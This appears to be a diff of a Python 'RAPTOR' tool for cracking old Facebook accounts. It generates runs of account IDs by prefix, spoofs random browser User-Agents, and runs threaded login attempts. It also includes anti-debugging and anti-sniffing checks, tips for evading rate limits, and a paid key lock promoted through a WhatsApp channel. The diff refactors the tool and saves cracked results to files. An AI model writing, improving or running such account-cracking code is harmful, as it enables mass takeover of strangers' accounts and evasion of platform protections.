@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 
 import os
 import re
@@ -6,10 +7,12 @@ import uuid
 import hashlib
 import random
 import string
-import requests  # pyright: ignore[reportMissingModuleSource]
+import requests
 import sys
 import json
 import urllib
+import subprocess
+import shutil
 import webbrowser
 from bs4 import BeautifulSoup
 from random import randint as rr
@@ -47,150 +50,82 @@ approved_keys = [
     # "YAHAN-APNI-KEY-DAALO"
 ]
 
+GREEN = "\033[1;32m"
+RESET = "\033[0m"
+MAX_ATTEMPTS = 3
+COOLDOWN_SECONDS = 8
+
+def clear_screen():
+    os.system("clear" if 'win' not in sys.platform else "cls")
+
+def open_link(url):
+    """Open URL using available method"""
+    try:
+        if 'win' in sys.platform:
+            webbrowser.open(url)
+        elif shutil.which("termux-open-url"):
+            subprocess.run(["termux-open-url", url], check=False)
+        elif shutil.which("xdg-open"):
+            subprocess.run(["xdg-open", url], check=False)
+        else:
+            try:
+                subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)
+            except:
+                webbrowser.open(url)
+    except Exception:
+        pass
+
+def normalize(s):
+    """Normalize string for comparison"""
+    if s is None:
+        return ""
+    return " ".join(s.split()).lower()
+
+approved_normalized = {normalize(k) for k in approved_keys}
+
 def first_step():
-    os.system("clear")
+    clear_screen()
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("         Script is Locked ")
+    print(f"        {GREEN}🔒 Script Locked 🔒{RESET}")
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-    print("\033[1;32m JOIN OUR WHATSAPP CHANNEL ✅ \033[0m\n")
-    print("\033[1;32m KEY IS PROVIDED IN THE CHANNEL \033[0m\n")
+    print(f"{GREEN} THIS TOOL IS PAID ✅ {RESET}\n")
+    print(f"{GREEN} JOIN OUR WHATSAPP CHANNEL ✅ {RESET}\n")
+    print(f"{GREEN} KEY IS PROVIDED IN THE CHANNEL {RESET}\n")
     print("[!] Join the WhatsApp Channel first.")
     print(f"[+] Channel Link: {channel_link}\n")
     
     # Automatically open WhatsApp channel
-    print("\033[1;33m[+] Opening WhatsApp Channel...\033[0m")
-    if 'win' in sys.platform:
-        webbrowser.open(channel_link)
-    else:
-        os.system(f'xdg-open "{channel_link}" 2>/dev/null')
-    time.sleep(2)
-    print("\033[1;32m[✓] WhatsApp Channel opened!\033[0m\n")
-
+    print(f"{GREEN}[+] Opening WhatsApp Channel...{RESET}")
+    try:
+        open_link(channel_link)
+        print(f"{GREEN}[✓] WhatsApp Channel opened!{RESET}\n")
+    except Exception as e:
+        print(f"Error while opening link: {e}")
+    
     input("\n[↩] Once you join the channel, press Enter...")
 
-def send_approval_request(request_id, user_key, timestamp):
-    """Send simple approval request to owner via WhatsApp"""
-    try:
-        # Simple message format
-        message = f"*Approval Needed*\n\n"
-        message += f"Time: {timestamp}\n"
-        message += f"Request ID: {request_id}\n"
-        message += f"Key: {user_key}\n\n"
-        message += f"Approve: {APPROVAL_WEB_URL}"
-        
-        # Create WhatsApp URL
-        whatsapp_url = f"https://wa.me/{OWNER_WHATSAPP}?text={urllib.parse.quote(message)}"
-        
-        # Open WhatsApp
-        print("\033[1;33m[+] Sending approval request...\033[0m")
-        if 'win' in sys.platform:
-            webbrowser.open(whatsapp_url)
-        else:
-            os.system(f'xdg-open "{whatsapp_url}" 2>/dev/null')
-        time.sleep(2)
-        print(f"\033[1;32m[✓] Request sent to owner\033[0m")
-        return True
-    except Exception as e:
-        print(f"\033[1;31m[×] Error: {e}\033[0m")
-        return False
-
-def save_request_to_github(request_id, user_key, timestamp):
-    """Save request to GitHub repository (JSON file)"""
-    try:
-        # Create request data
-        request_data = {
-            request_id: {
-                "key": user_key,
-                "timestamp": timestamp,
-                "status": "pending"
-            }
-        }
-        
-        # If GitHub token available, use API to update
-        if GITHUB_TOKEN and GITHUB_REPO != "yourusername/approvals-repo":
-            # GitHub API call would go here
-            # For now, we'll use local file that can be synced
-            pass
-        
-        # Save locally (you can sync this to GitHub manually or via script)
-        local_file = "pending_requests.json"
-        existing_data = {}
-        if os.path.exists(local_file):
-            try:
-                with open(local_file, 'r') as f:
-                    existing_data = json.load(f)
-            except:
-                pass
-        
-        existing_data.update(request_data)
-        with open(local_file, 'w') as f:
-            json.dump(existing_data, f, indent=2)
-        
-        return True
-    except:
-        return False
-
-def check_approval_status(request_id, max_wait=300):
-    """Check if request is approved (checks every 5 seconds)"""
-    print("\033[1;33m[⏳] Waiting for approval...\033[0m")
-    print(f"\033[1;36m[!] Web interface: {APPROVAL_WEB_URL}\033[0m\n")
-    
-    start_time = time.time()
-    check_interval = 5
-    
-    while time.time() - start_time < max_wait:
-        # Check local file
-        local_file = "pending_requests.json"
-        if os.path.exists(local_file):
-            try:
-                with open(local_file, 'r') as f:
-                    data = json.load(f)
-                    if request_id in data and data[request_id].get('status') == 'approved':
-                        print("\033[1;32m[✓] Approved! Script proceeding...\033[0m\n")
-                        return True
-            except:
-                pass
-        
-        # Check GitHub (if token available)
-        if GITHUB_TOKEN and GITHUB_REPO != "yourusername/approvals-repo":
-            try:
-                url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/requests.json"
-                response = requests.get(url, timeout=5)
-                if response.status_code == 200:
-                    data = response.json()
-                    if request_id in data and data[request_id].get('status') == 'approved':
-                        print("\033[1;32m[✓] Approved! Script proceeding...\033[0m\n")
-                        return True
-            except:
-                pass
-        
-        elapsed = int(time.time() - start_time)
-        print(f"\r\033[1;33m[⏳] Waiting... ({elapsed}s/{max_wait}s)\033[0m", end='', flush=True)
-        time.sleep(check_interval)
-    
-    print("\n\033[1;31m[×] Approval timeout!\033[0m\n")
-    return False
-
 def check_key():
-    user_key = input("\n[?] Enter the key: ")
+    """Check key with retry logic"""
+    attempts = 0
+    while attempts < MAX_ATTEMPTS:
+        user_key = input("\n[?] Enter the key: ")
+        user_norm = normalize(user_key)
+        
+        if user_norm in approved_normalized:
+            print(f"\n{GREEN}[✓] Key approved! Script is running...{RESET}\n")
+            return True
+        else:
+            attempts += 1
+            remaining = MAX_ATTEMPTS - attempts
+            if remaining > 0:
+                print(f"\n{GREEN}[×] Invalid key! Attempts left: {remaining}{RESET}")
+            else:
+                print(f"\n[!] Too many wrong attempts. Wait {COOLDOWN_SECONDS} seconds.")
+                time.sleep(COOLDOWN_SECONDS)
+                sys.exit(1)
     
-    if user_key not in approved_keys:
-        print("\n[×] Invalid key! Please try again.")
-        sys.exit()
-    
-    # Key is valid, proceed
-    print("\n[✓] Key verified! Script is running...\n")
-
-# First step is to open the channel
-first_step()
-
-# Then the key check will happen
-check_key()
-
-# Main code of the tool is here
-print(">>> Tool is successfully unlocked <<<")
-
-
+    print(f"\n[!] Too many wrong attempts. Exiting...")
+    sys.exit(1)
 
 # Ensure required modules are installed
 modules = ['requests', 'urllib3', 'mechanize', 'rich']
@@ -202,25 +137,21 @@ for module in modules:
         os.system(f'pip install {module}')
         print(f"[+] {module} has been installed successfully!")
 
-# Suppress InsecureRequestWarning to avoid warnings
+# Suppress InsecureRequestWarning
 from requests.exceptions import ConnectionError
 from requests import api, models, sessions
 requests.urllib3.disable_warnings()
 
-
 # Initial setup and promotion
-os.system('clear')
+os.system('clear' if 'win' not in sys.platform else 'cls')
 print(' \x1b[38;5;46mSERVERS ARE LOADING...')
 
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('pip install httpx pip install beautifulsoup4')
+os.system('pip install httpx beautifulsoup4')
 print('loading Modules ...\n')
-os.system('clear')
-
+os.system('clear' if 'win' not in sys.platform else 'cls')
 
 # --- Anti-tampering and Security Checks ---
-# The script checks if the source code of the 'requests' library has been modified
-# or if packet sniffing tools are being used.
 try:
     api_body = open(api.__file__, 'r').read()
     models_body = open(models.__file__, 'r').read()
@@ -231,7 +162,6 @@ try:
             exit()
 except:
     pass
-
 
 # A security class to detect debugging and packet sniffing tools.
 class sec:
@@ -258,16 +188,13 @@ class sec:
             self.fuck()
 
     def fuck(self):
-        """
-        Terminates the script if tampering is detected.
-        """
+        """Terminates the script if tampering is detected."""
         print(' \x1b[1;32m Congratulations ! ')
         self.linex()
         exit()
 
     def linex(self):
         print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
 
 # Global variables
 method = []
@@ -286,11 +213,8 @@ RR = '\x1b[38;5;196m'
 GS = '\x1b[38;5;40m'
 W = '\x1b[1;37m'
 
-
 def windows():
-    """
-    Generates a random Windows User-Agent string.
-    """
+    """Generates a random Windows User-Agent string."""
     aV = str(random.choice(range(10, 20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
     bV = str(random.choice(range(1, 36)))
@@ -304,11 +228,8 @@ def windows():
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
     return random.choice([A, B, C, D])
 
-
 def window1():
-    """
-    Generates another variant of a random Windows User-Agent string.
-    """
+    """Generates another variant of a random Windows User-Agent string."""
     aV = str(random.choice(range(10, 20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
     bV = str(random.choice(range(1, 36)))
@@ -324,25 +245,19 @@ def window1():
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
 
-
 # Set window title
 sys.stdout.write('\x1b]2; RAPTOR :) \x07')
 
-
-    # RAPTOR Clover Logo - Green - Version 2.5
 def ____banner____():
+    """Displays the main banner and tool information."""
     if 'win' in sys.platform:
         os.system('cls')
     else:
         os.system('clear')
-    
     print(BANNER_TEXT)
 
-
 def creationyear(uid):
-    """
-    Estimates the Facebook account creation year based on the UID.
-    """
+    """Estimates the Facebook account creation year based on the UID."""
     if len(uid) == 15:
         if uid.startswith('1000000000'):
             return '2009'
@@ -394,32 +309,36 @@ def creationyear(uid):
     else:
         return ''
 
-
 def clear():
-    os.system('clear')
+    os.system('clear' if 'win' not in sys.platform else 'cls')
 
 def write_result(file_name: str, content: str) -> None:
+    """Write results to file"""
     try:
+        # Try results folder first (cross-platform)
         out_dir = os.path.join(os.getcwd(), 'results')
         os.makedirs(out_dir, exist_ok=True)
-        with open(os.path.join(out_dir, file_name), 'a', encoding='utf-8') as f:
+        result_path = os.path.join(out_dir, file_name)
+        with open(result_path, 'a', encoding='utf-8') as f:
             f.write(content)
     except Exception:
-        pass
-
+        # Fallback to /sdcard for Android
+        try:
+            sdcard_path = f'/sdcard/{file_name}'
+            with open(sdcard_path, 'a', encoding='utf-8') as f:
+                f.write(content)
+        except Exception:
+            pass
 
 def linex():
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-
 def BNG_71_():
-    """
-    Main menu function.
-    """
+    """Main menu function."""
     ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CLONE')
     linex()
-    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
+    __Jihad__ = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
     if __Jihad__ in ('A', 'a', '01', '1'):
         old_clone()
     else:
@@ -427,11 +346,8 @@ def BNG_71_():
         time.sleep(2)
         BNG_71_()
 
-
 def old_clone():
-    """
-    Menu for selecting old account cloning type.
-    """
+    """Menu for selecting old account cloning type."""
     ____banner____()
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mALL SERIES')
     linex()
@@ -450,11 +366,8 @@ def old_clone():
         print(f"\n[×]{rad} Choose Value Option... ")
         BNG_71_()
 
-
 def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
+    """Cloning method for accounts from 2010-2014."""
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOld Code {Y}:{G} 2010-2014")
@@ -487,11 +400,8 @@ def old_One():
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
-
 def old_Tow():
-    """
-    Cloning method for accounts with specific prefixes.
-    """
+    """Cloning method for accounts with specific prefixes."""
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
@@ -525,18 +435,15 @@ def old_Tow():
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
-
 def old_Tree():
-    """
-    Cloning method for accounts from 2009-2010.
-    """
+    """Cloning method for accounts from 2009-2010."""
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
     ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} @50000 / 70000 / 99999")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
     limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
     linex()
     prefix = '1000004'
@@ -551,7 +458,7 @@ def old_Tree():
     with tred(max_workers=30) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MODE FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -562,11 +469,8 @@ def old_Tree():
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
-
 def login_1(uid):
-    """
-    Login attempt method 1.
-    """
+    """Login attempt method 1."""
     global loop
     session = requests.session()
     try:
@@ -628,11 +532,8 @@ def login_1(uid):
     except Exception:
         time.sleep(5)
 
-
 def login_2(uid):
-    """
-    Login attempt method 2.
-    """
+    """Login attempt method 2."""
     global loop
     sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAPTOR-M2\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
@@ -666,4 +567,14 @@ def login_2(uid):
     loop += 1
 
 if __name__ == '__main__':
+    # First step is to open the channel
+    first_step()
+    
+    # Then the key check will happen
+    check_key()
+    
+    # Main code of the tool is here
+    print(">>> Tool is successfully unlocked <<<")
+    
+    # Run main menu
     BNG_71_()
